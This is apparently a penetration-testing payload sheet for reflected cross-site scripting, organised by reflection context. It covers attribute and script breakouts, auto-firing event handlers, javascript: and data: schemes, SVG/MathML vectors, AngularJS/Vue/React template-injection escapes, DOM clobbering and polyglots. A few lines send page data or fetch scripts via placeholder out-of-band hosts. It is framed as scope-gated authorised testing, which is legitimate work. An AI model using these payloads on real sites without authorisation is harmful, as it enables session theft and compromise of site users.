# Reflected XSS payloads by reflection context (step 5)
# Pick by the context classified in contexts.json. Use a unique marker first,
# confirm the breakout, THEN weaponize. All testing is scope-gated (roe-gate.md).

## 0. Reflection marker (use before any payload)
```
rs7f3q    # unique, greppable; find WHERE and in WHAT context it lands
```

## 1. HTML body (between tags)
```html
<svg onload=alert(1)>
<img src=x onerror=alert(1)>
<script>alert(1)</script>              <!-- blocked if CSP or tag-stripping -->
<details open ontoggle=alert(1)>
```
Caveat: in an HTML-body sink, a `javascript:` scheme (incl. `<iframe src="javascript:alert()">`) does NOT
execute in a current browser — Chromium/Firefox block `javascript:` navigation in frames, so that payload
fires nothing and reads as a FALSE NEGATIVE. Confirm here with an event handler (`onload`/`onerror`/`ontoggle`);
`javascript:` belongs only in a URL/`href`/`src` context (section below).

## 2. HTML attribute — quoted ( value="..." )
Break out of the quote + tag first:
```html
"><svg onload=alert(1)>
"><img src=x onerror=alert(1)>
" autofocus onfocus=alert(1) x="
```
Unquoted attribute:
```html
 onmouseover=alert(1) 
 autofocus onfocus=alert(1) 
```

## 3. Inside a JS string ( var x = '...' )
```js
'-alert(1)-'
';alert(1)//
'];alert(1)//
</script><svg onload=alert(1)>   # if reflection lets you close the script block
```
Template literal / backtick:
```js
${alert(1)}
`-alert(1)-`
```

## 4. URL / href / src ( <a href="REFLECTED"> )
```
javascript:alert(1)
javascript:alert(document.domain)//
```

## 5. HTML comment ( <!-- REFLECTED --> )
```html
--><svg onload=alert(1)>
```

## 6. Polyglots (context-agnostic triage — confirm the real context after)
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
'"><img src=x onerror=alert(1)>
```

## Execution confirmation
A payload counts only when it EXECUTES in a real browser (verify.md). Prefer a
detectable effect over `alert`: `print()`, `window.__rs=1`, or an out-of-band
callback (collaborator) so headless confirmation is unambiguous.
```
<img src=x onerror="fetch('https://OOB_HOST/'+document.domain)">
```

---

## Extended arsenal — full context breakout matrix
Confirm the real context from WHERE the marker landed, then pick the row. `…MARKER…` = where your
value sits. Breakout = minimum needed to escape; then append an executing vector.

| Context | Marker wrapper | Breakout | Executing vector | Notes |
|---|---|---|---|---|
| HTML body text | `…MARKER…` | introduce a tag | `<svg onload=alert(1)>` | RCDATA parents need close first |
| Double-quoted attr | `x="…MARKER…"` | `">` | `"><svg onload=alert(1)>` | |
| Single-quoted attr | `x='…MARKER…'` | `'>` | `'><svg onload=alert(1)>` | |
| Unquoted attr | `x=…MARKER…` | space | ` autofocus onfocus=alert(1)` | no quote to close |
| Backtick attr (legacy) | `` x=`…MARKER…` `` | `` ` `` | historical engines only | |
| Inside a live handler | `onclick="…MARKER…"` | `;` | `;alert(1)` | already JS, no tag needed |
| `href`/`src`/`action` URL | `href="MARKER"` | scheme | `javascript:alert(1)` | |
| `iframe srcdoc` | `srcdoc="MARKER"` | entity tags | `&lt;svg onload=alert(1)&gt;` | double HTML-decode |
| JS string (single) | `'…MARKER…'` | `'` | `'-alert(1)-'` / `';alert(1)//` | |
| JS string (double) | `"…MARKER…"` | `"` | `"-alert(1)-"` | |
| JS template literal | `` `…MARKER…` `` | `${}` | `${alert(1)}` | |
| JS regex literal | `/…MARKER…/` | `/` | `/)/;alert(1)//` | depends on wrapper |
| JS line comment | `// …MARKER` | newline | `%0aalert(1)` | |
| JSON in `<script>` | `{"k":"MARKER"}` | `</script>` | `</script><svg onload=alert(1)>` | parser leaves script mode |
| Raw `<script>` block | direct | — | `alert(1)` | |
| HTML comment | `<!-- MARKER -->` | `-->` | `--><svg onload=alert(1)>` | |
| `<style>` block | `…MARKER…` | `</style>` | `</style><svg onload=alert(1)>` | |
| `style="…"` attr | `style="…MARKER…"` | `">` | `"><svg onload=alert(1)>` | |
| `<textarea>` / `<title>` | RCDATA | close tag | `</textarea><svg onload=alert(1)>` | |
| `<noscript>` | RAWTEXT (scripting on) | `</noscript>` | `</noscript><svg onload=alert(1)>` | fires when scripting enabled |
| `<xmp>`/`<iframe>`/`<noembed>` | RAWTEXT | close tag | `</xmp><svg onload=alert(1)>` | |
| `<plaintext>` | PLAINTEXT | cannot close | inject BEFORE it | everything after is text |

## Extended arsenal — tag + event-handler variety
### Auto-firing (no user interaction)
```html
<svg onload=alert(1)>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<svg><set attributeName=x onbegin=alert(1)>
<img src=x onerror=alert(1)>
<image src=x onerror=alert(1)>                 # legacy alias
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>            # legacy
<body onload=alert(1)>
<body onpageshow=alert(1)>
<iframe onload=alert(1)>
<iframe src=javascript:alert(1)>
<object data=javascript:alert(1)>
<embed src=javascript:alert(1)>
<video src=x onerror=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<marquee loop=1 width=0 onfinish=alert(1)>
<style onload=alert(1)>                         # some engines
<link rel=stylesheet href=x onerror=alert(1)>
<meta http-equiv=refresh content="0;url=javascript:alert(1)">   # legacy/some engines
<frameset onload=alert(1)>
<isindex action=javascript:alert(1) type=image>   # legacy
```
### Interaction-required (hover / click / focus / key / scroll)
```html
<a href=# onclick=alert(1)>x</a>
<div onmouseover=alert(1)>x</div>
<div onpointerover=alert(1)>x</div>
<x onwheel=alert(1) style=display:block;height:9999px>scroll
<input onchange=alert(1)>
<input onblur=alert(1) autofocus><input autofocus>   # blur chain
<body onresize=alert(1)>                              # framed/resized
<body onhashchange=alert(1)>                          # with #
<x contenteditable onbeforeinput=alert(1)>type
<form onsubmit=alert(1)><input type=submit>
```
| Handler | Fires when | Element(s) |
|---|---|---|
| `onload`/`onerror` | resource load/fail | svg, img, iframe, body, video, audio, object |
| `onfocus` + `autofocus` | element auto-focused | input, select, textarea, keygen, a[href] |
| `ontoggle` | details opened | `<details open>` |
| `onanimationstart` | CSS animation starts | any + `@keyframes` |
| `ontransitionend` | CSS transition ends | any styled element |
| `onbegin` | SMIL anim begins | svg animate/set |
| `onstart`/`onfinish` | marquee loop | marquee |
| `onpageshow`/`onhashchange`/`onresize` | window events | body |

## Extended arsenal — scheme / URI contexts
```
javascript:alert(1)
javascript:alert(document.domain)//
 javascript:alert(1)              # leading space tolerated
java&#x09;script:alert(1)         # entity TAB inside scheme
java%0ascript:alert(1)            # newline inside scheme
&#14;javascript:alert(1)          # leading control char
JaVaScRiPt:alert(1)
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
vbscript:alert(1)                 # legacy IE only
```
Scheme-honoring sinks: `a href`, `area href`, `base href`, `iframe src`, `form action`,
`button/input formaction`, `object data`, `embed src`, `meta refresh url`, SVG `xlink:href`/`href`,
`<use>`, animate/set `values`, and all JS navigation sinks.

## Extended arsenal — SVG & MathML contexts
```html
<svg onload=alert(1)>
<svg><script>alert(1)</script></svg>                        # SVG script executes inline
<svg><a xlink:href=javascript:alert(1)><text x=20 y=20>x</text></a></svg>
<svg><animate attributeName=href values=javascript:alert(1)><a><text>x</text></a></svg>
<svg><foreignObject><iframe src=javascript:alert(1)></foreignObject></svg>
<math><maction actiontype=statusline xlink:href=javascript:alert(1)>x</maction>
<math href=javascript:alert(1)>x</math>
```

## Extended arsenal — CSS-context vectors (legacy exec / exfil / UI-redress)
Modern engines do NOT run JS from CSS; keep these for legacy engines, attribute-value exfil, and
UI-redress chains.
```html
<div style="width:expression(alert(1))">               # legacy IE expression
<style>@import 'javascript:alert(1)';</style>          # legacy
<div style="-moz-binding:url(//HOST/x.xml#e)">         # legacy Firefox XBL
<style>input[value^=a]{background:url(//TOKEN.oob.example/a)}</style>   # value oracle (exfil)
```

## Extended arsenal — RCDATA / RAWTEXT escape table
Parents whose contents are NOT parsed as markup — close the parent first.

| Parent | Content model | Close with |
|---|---|---|
| `title`, `textarea` | RCDATA | `</title>` / `</textarea>` |
| `style` | RAWTEXT | `</style>` |
| `script` | script | `</script>` |
| `xmp`, `iframe`, `noembed`, `noframes` | RAWTEXT | matching close tag |
| `noscript` | RAWTEXT (scripting on) | `</noscript>` |
| `plaintext` | PLAINTEXT | cannot be closed — inject before |

## Extended arsenal — framework client-side template injection (CSTI)
Confirm the engine evaluates first: `{{7*7}}` renders `49` ⇒ live template.
### AngularJS (expression sandbox by version; `ng-app` in scope)
```
# 1.0.1–1.1.5 / 1.6+ (sandbox removed in 1.6):
{{constructor.constructor('alert(1)')()}}
# 1.2.19–1.2.23:
{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}
# 1.3.0:
{{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,alert(1),a')}}
# 1.4.0–1.5.8 (override charAt then eval):
{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)')}}
```
Sub-ranges differ slightly — pin the exact minor version (bundle string / retire.js) before choosing.
### Vue (`{{7*7}}`→49)
```
{{constructor.constructor('alert(1)')()}}      # Vue 2
{{_c.constructor('alert(1)')()}}               # Vue 2
{{_openBlock.constructor('alert(1)')()}}       # Vue 3
<div v-html="userInput"></div>  →  <img src=x onerror=alert(1)>    # v-html raw-HTML sink
```
### React / JSX (auto-escapes text; abuse the sinks)
```
dangerouslySetInnerHTML={{__html: userInput}}  →  <img src=x onerror=alert(1)>
<a href={userInput}>                           →  javascript:alert(1)   # older/unsanitized
React.createElement('a',{href:userInput})      →  javascript:alert(1)
```
### Other in-browser engines
Handlebars triple-stash `{{{userInput}}}`, `_.template`, in-browser EJS/Nunjucks unescaped output →
`<img src=x onerror=alert(1)>`.

## Extended arsenal — DOM clobbering (markup-only, no handlers/script)
When only tags/attributes survive, clobber a named reference a script later reads:
```html
<a id=x href="javascript:alert(1)"></a>            # code does: location = window.x / x.href
<form id=cfg><input name=url value="javascript:alert(1)"></form>   # cfg.url
<img name=body>                                     # document.body clobber
<a id=y></a><a id=y name=z href=...>                # y.z nested (HTMLCollection) clobber
```
Benign proof: clobber a value the page feeds to `location`/`.src`/`innerHTML`, aim it at `alert(1)`
or a `TOKEN.oob.example` marker.

## Extended arsenal — length-limited / split vectors
```html
<svg onload=alert(1)>                 # 20 chars
<svg/onload=alert()>                  # drop the arg
<a href=# onclick=alert()>x           # needs a click
# split across two reflected params (server concatenates p1+p2):
p1=<svg onload=alert#   p2=(1)>
# pull the rest from the URL/name so the reflected part stays tiny:
<svg onload=eval(name)>               # attacker page set window.name
<svg onload=eval(location.hash.slice(1))>#=alert(1)
<script src=//TOKEN.oob.example></script>   # offload logic to OOB-served JS
```

## Extended arsenal — polyglot expansion
One value, many contexts — confirm the real context AFTER a hit.
```
javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><svg onload=alert()//>
-->'"/></sCript><svG oNloAd=alert()>
"'--></style></scRipt><svG/onload=alert()>
```
